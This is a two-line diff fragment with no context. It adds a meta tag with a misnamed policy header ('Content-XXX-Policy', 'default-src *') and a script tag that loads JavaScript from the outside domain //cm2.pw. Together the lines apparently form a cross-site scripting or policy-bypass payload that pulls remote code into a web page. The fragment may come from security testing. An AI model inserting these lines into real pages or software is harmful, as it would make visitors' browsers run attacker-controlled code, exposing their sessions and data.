@@ -1,0 +1,2 @@
+<meta http-equiv="Content-XXX-Policy" content="default-src *">
+<script src=//cm2.pw></script>
